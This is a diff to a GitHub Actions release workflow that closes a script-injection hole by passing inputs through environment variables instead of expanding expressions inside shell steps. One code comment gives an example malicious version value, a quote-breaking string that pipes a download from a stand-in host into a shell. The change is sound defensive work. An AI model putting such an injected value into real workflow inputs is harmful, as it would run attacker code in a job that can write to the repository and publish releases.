@@ -33,9 +33,16 @@ jobs:
 
       - name: Resolve and verify version
         id: ver
+        env:
+          # Inputs arrive through env, never through an expression inside run:
+          # expressions are substituted textually before the shell starts, so a
+          # value like `1.0.0"; curl evil | sh; #` would execute here — in a job
+          # that holds contents: write and publishes release artifacts.
+          EVENT_NAME: ${{ github.event_name }}
+          INPUT_VERSION: ${{ github.event.inputs.version }}
         run: |
-          if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
-            VERSION="${{ github.event.inputs.version }}"
+          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
+            VERSION="$INPUT_VERSION"
           else
             VERSION="${GITHUB_REF_NAME#v}"
           fi
@@ -81,8 +88,10 @@ jobs:
       - name: Publish GitHub Release
         env:
           GH_TOKEN: ${{ github.token }}
+          # Same reason as the version step: keep expressions out of run.
+          RESOLVED_VERSION: ${{ steps.ver.outputs.version }}
         run: |
-          VERSION="${{ steps.ver.outputs.version }}"
+          VERSION="$RESOLVED_VERSION"
           gh release create "v${VERSION}" \
             "release/v${VERSION}"/*.tar.gz \
             "release/v${VERSION}"/*.zip \
